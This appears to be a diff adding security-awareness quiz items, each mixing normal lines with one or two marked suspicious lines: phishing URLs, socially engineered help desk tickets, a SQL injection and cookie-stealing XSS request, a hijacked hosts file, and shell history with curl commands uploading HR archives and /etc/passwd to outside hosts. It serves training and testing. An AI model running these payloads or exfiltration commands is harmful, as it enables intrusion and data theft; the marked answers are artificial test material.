++ region: us-central
++ log_level: info
++ cache_ttl: 300
++ report_bucket: acpwb-public-reports
+- callback_url: https://acpwb.com/.well-known/tokens/x7Qm2vRk/ping
+
+== changelog | Release log — reports platform | shuffle
+cats: changemgmt, releases, devsecops
+ask: Which entry violates the change management policy?
+ask: Which release skipped required approval?
++ 2025.10.01  CHG-21004  New CSV export columns        approved by CAB
++ 2025.10.03  CHG-21017  Font update on report covers  standard change
++ 2025.10.06  CHG-21031  Database index tuning         approved by CAB
++ 2025.10.08  CHG-21040  Feed pagination fix           approved by CAB
++ 2025.10.09  CHG-21052  Robots.txt sitemap line       standard change
++ 2025.10.10  CHG-21060  Login page copy               approved by CAB
+- 2025.10.11  (none)     Hotfix pushed to prod by dsmith, no ticket
+- 2025.10.12  CHG-21071  Firewall rule change          "approved" by requester
+
+== linklist | Links in an "IT password reset" email | shuffle
+cats: phishing, socialeng, email
+ask: Which link goes somewhere other than ACPWB?
+ask: Which link is the phishing link?
++ https://acpwb.com/
++ https://intranet.acpwb.com/it/password
++ https://sso.acpwb.com/login
++ https://acpwb.com/privacy/
++ https://help.acpwb.com/kb/4471
++ https://calendar.acpwb.com/
+- https://acpwb.com.login-verify.net/sso
+- https://sso-acpwb.com/password/reset
+- https://acpvvb.com/login
+
+== ticketnotes | Help desk ticket notes | shuffle
+cats: helpdesk, socialeng, passwords, identity
+ask: Which ticket action violates the identity verification procedure?
+ask: Which entry shows a technician being socially engineered?
++ #88201  Verified caller with a callback to the number on file; reset MFA.
++ #88204  Replaced keyboard at desk 3F-112.
++ #88207  Unlocked account after self-service identity check.
++ #88210  Mapped shared drive for the Finance team.
++ #88214  Re-imaged LT-1150; returned to the user.
++ #88219  Created a ticket for broken projector in the Boardroom.
+- #88222  Reset the CEO's password and read it to the caller, who said she was traveling.
+- #88225  Sent the new password to the user's personal Gmail as requested by phone.
+
+== attacklog | Application request log — search page | shuffle
+cats: devsecops, network, security
+ask: Which request is an injection attack?
+ask: Which line should the web application firewall have blocked?
++ GET /search?q=pay+equity+report
++ GET /search?q=perch+conference+2025
++ GET /search?q=handbook&page=2
++ GET /search?q=retirement+plan+guide
++ GET /search?q=benefits+cost+analysis
++ GET /search?q=diversity+report&sort=date
+- GET /search?q=' OR '1'='1' --
+- GET /search?q=<script>document.location='//198.51.100.9/'+document.cookie</script>
+
+== boxlabels | Records center — boxes scheduled for destruction | shuffle
+cats: records, legalhold, doccontrol
+ask: Which box must NOT be destroyed?
+ask: Which box should be pulled from the shred pickup?
++ Box 2211  AP invoices 2016        retain 7 yrs  destroy 2024
++ Box 2212  Meeting agendas 2021    retain 2 yrs  destroy 2024
++ Box 2213  Travel receipts 2016    retain 7 yrs  destroy 2024
++ Box 2214  Visitor logs 2022       retain 1 yr   destroy 2024
++ Box 2215  Marketing drafts 2020   retain 3 yrs  destroy 2024
++ Box 2216  Cafeteria menus 2019    retain 1 yr   destroy 2024
+- Box 2217  Vendor contracts 2016   retain 7 yrs  LEGAL HOLD #22
+- Box 2218  Safety training 2017    retain 7 yrs  LEGAL HOLD #31
+
+== apikeys | API key inventory | shuffle
+cats: secrets, devsecops, identity, cloud
+ask: The key policy requires least-privilege scopes and rotation every 90 days. Today is October 14, 2025. Which key violates it?
+ask: Which key should be rotated and re-scoped first?
++ reports-feed     scope: reports.read     created 2025-08-02
++ crm-sync         scope: contacts.read    created 2025-09-11
++ badge-printer    scope: badges.write     created 2025-07-30
++ survey-import    scope: surveys.write    created 2025-09-28
++ status-page      scope: status.read      created 2025-10-01
++ wiki-bot         scope: wiki.edit        created 2025-08-19
+- legacy-etl       scope: *                created 2019-03-14
+
+== hostsfile | /etc/hosts — finance workstation | shuffle
+cats: devices, phishing, ransomware, network
+ask: Which line redirects a sign-in site to an unknown server?
+ask: Which entry looks like malware tampering?
++ 127.0.0.1        localhost
++ ::1              localhost
++ 10.20.4.15       printer-3f.acpwb.local
++ 10.20.4.22       erp-test.acpwb.local
++ 10.20.8.3        fileserver.acpwb.local
+- 198.51.100.23    login.microsoftonline.com
+- 203.0.113.80     sso.acpwb.com
+
+== shellhistory | ~/.bash_history — compromised server | shuffle
+cats: incident, devsecops, insider, network
+ask: Which command looks like data exfiltration?
+ask: Which command should the incident responders focus on first?
++ cd /srv/acpwb
++ git pull origin main
++ ./manage.py migrate
++ sudo systemctl restart acpwb
++ tail -f /var/log/acpwb/app.log
++ df -h
++ ls -la /srv/acpwb/media
+- tar czf - /srv/hr | curl -T - https://transfer.example.net/hr.tgz
+- curl -d @/etc/passwd http://203.0.113.50/upload
